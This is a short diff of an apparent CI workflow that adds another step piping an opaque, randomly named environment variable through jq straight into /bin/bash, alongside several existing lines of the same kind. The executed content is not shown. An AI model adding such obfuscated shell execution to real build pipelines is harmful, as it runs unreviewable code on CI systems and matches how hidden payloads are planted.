@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$fcfn15" | jq -r .nts95600 | /bin/bash
           echo $ox20941 | jq -r .fqzip77 | /bin/bash
           printf '%s' "$ljfqj35" | jq -r .ddmqg95258 | /bin/bash
+          printf '%s' "$eky64791" | jq -r .ntc532 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
